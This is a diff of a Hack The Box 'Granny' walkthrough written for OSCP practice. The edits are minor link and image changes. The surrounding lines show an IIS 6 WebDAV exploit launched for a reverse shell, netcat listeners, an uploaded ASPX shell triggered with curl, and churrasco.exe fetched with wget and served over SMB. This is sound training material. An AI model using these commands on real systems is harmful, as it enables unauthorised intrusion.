@@ -13,7 +13,7 @@ picture: /assets/htb-granny/machine_info.png
 author_profile: true
 ---
 
-> NOTE: This write-up is part of a set, with the other being Grandpa. Since the boxes are so similar, but the easy way to root is via Metasploit, I decided to do one with MSF, and one without. Grandpa will be done with Metaspliot, and Granny done without Metasploit, in order to better practice for the OSCP.
+> NOTE: This write-up is part of a set, with the other being [Grandpa](https://dm7500.github.io/oscp-prep/2020-01-30-HTB-Grandpa/). Since the boxes are so similar, but the easy way to root is via Metasploit, I decided to do one with MSF, and one without. Grandpa will be done with Metaspliot, and Granny done without Metasploit, in order to better practice for the OSCP.
 
 ![](/assets/htb-granny/machine_info.png)
 
@@ -57,7 +57,7 @@ This box has 2 methods of remote exploitation on WebDAV. One is manual, and more
 
 If you read the Grandpa write-up, you'll see that the Metasploit module we ran exploited a remote buffer overflow in IIS. [We can find the manual version of this exploit here](https://www.exploit-db.com/exploits/41738). However, this code is formatted to only launch calc.exe locally. We can instead use [this exploit](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell), using the same method as the first. Let's save it locally as `exploit.py`, and run it with `python exploit.py 10.10.10.15 80 10.10.14.35 7500`. Make sure you kick off a listener with `nc -lvnp 7500` before launching the exploit.
 
-![](/assets/htb-granny/iis_exploit_shell.png)
+<a href="/assets/htb-granny/iis_exploit_shell.png"><img src="/assets/htb-granny/iis_exploit_shell.png" width="95%"></a>
 
 As you can see, we get back the reverse shell!
 
@@ -89,11 +89,9 @@ We can now `MOVE` the file with `move shell.txt shell.aspx`.
 
 Now start a listener with `nc -lvnp 7500`, and call the script with `curl http://10.10.10.15/shell.aspx`.
 
-![](/assets/htb-granny/curl_shell.png)
+<a href="/assets/htb-granny/curl_shell.png"><img src="/assets/htb-granny/curl_shell.png" width="95%"></a>
 
 We got our shell!
-
----
 
 ## Privilege Escalation
 
@@ -115,7 +113,7 @@ Seeing that we have the `SeImpersonatePrivilege` privilege enabled on this accou
 
 The well-known exploit for this attack is called `churrasco.exe`, and can be [found here](https://github.com/Re4son/Churrasco). We can download the `churrasco.exe` locally with `wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe`, and launch an SMB server with `sudo impacket-smbserver kali .`. This SMB server will allow us to easily get the EXE onto the target.
 
-![](/assets/htb-granny/wget_smbserver.png)
+<a href="/assets/htb-granny/wget_smbserver.png"><img src="/assets/htb-granny/wget_smbserver.png" width="95%"></a>
 
 On the target, we need to create the `C:\temp` directory with the below commands. This gives us a writable location to work from.
 
